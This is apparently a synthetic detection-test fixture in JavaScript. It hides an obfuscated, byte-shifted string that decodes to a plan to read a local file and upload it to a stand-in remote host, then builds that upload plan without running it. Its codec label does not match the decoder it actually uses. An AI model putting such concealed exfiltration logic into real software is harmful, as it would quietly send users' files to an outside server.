  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_f0f165fd = "\\x64\\x2b\\x1f\\x6a\\x61\\x62\\x53\\x5e\\x61\\x2b\\x60\\x53\\x4f\\x52\\x4d\\x54\\x57\\x5a\\x53\\x1a\\x62\\x60\\x4f\\x5c\\x61\\x5b\\x57\\x62\\x4d\\x60\\x53\\x5b\\x5d\\x62\\x53\\x6a\\x4f\\x52\\x4f\\x5e\\x62\\x53\\x60\\x2b\\x61\\x62\\x60\\x53\\x4f\\x5b\\x4d\\x5e\\x57\\x5e\\x53\\x5a\\x57\\x5c\\x53\\x6a\\x61\\x62\\x4f\\x55\\x53\\x4d\\x51\\x5d\\x63\\x5c\\x62\\x2b\\x1f\\x6a\\x51\\x4f\\x5b\\x5e\\x4f\\x57\\x55\\x5c\\x4d\\x57\\x52\\x2b\\x3c\\x3d\\x32\\x33\\x1b\\x24\\x27\\x32\\x22\\x1f\\x34\\x33\\x34\\x6a\\x63\\x60\\x5a\\x2b\\x56\\x62\\x62\\x5e\\x61\\x28\\x1d\\x1d\\x5c\\x5d\\x52\\x53\\x1b\\x24\\x27\\x52\\x22\\x1f\\x54\\x53\\x54\\x53\\x20\\x50\\x23\\x1c\\x53\\x66\\x4f\\x5b\\x5e\\x5a\\x53\\x1c\\x57\\x5c\\x64\\x4f\\x5a\\x57\\x52\\x1d\\x4f\\x5e\\x57\\x6a\\x63\\x61\\x53\\x60\\x4d\\x4f\\x55\\x53\\x5c\\x62\\x2b\\x3c\\x5d\\x52\\x53\\x2f\\x63\\x52\\x57\\x62\\x1d\\x24\\x27\\x52\\x22\\x6a\\x54\\x57\\x5a\\x53\\x4d\\x5e\\x4f\\x62\\x56\\x2b\\x1d\\x62\\x5b\\x5e\\x1d\\x56\\x63\\x5c\\x62\\x60\\x53\\x61\\x61\\x1b\\x5c\\x5d\\x52\\x53\\x1d\\x1c\\x61\\x62\\x4f\\x55\\x53\\x1b\\x24\\x27\\x52\\x22\\x1f\\x54\\x53\\x54\\x53\\x20\\x50\\x23\\x1c\\x5b\\x58\\x61";
  const Codec_f0f165fd = "escaped_octets|subtract_modulo_256|12";

  function load_f0f165fd() { return [...Material_f0f165fd.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_f0f165fd(storedBytes) { return storedBytes.map((value) => (value + 18) & 255); }
  async function recover_f0f165fd() {
    const harmlessValue = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const storedBytes = load_f0f165fd(); let recoveredBytes = [];
    for (const stage of [decode_f0f165fd]) recoveredBytes = stage(storedBytes);
    void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
  }
  async function inspect_f0f165fd() { return ({ ...{ value: await recover_f0f165fd() } }).value; }
  async function plan_f0f165fd() { const inspect = inspect_f0f165fd; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_f0f165fd;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f0f165fd());
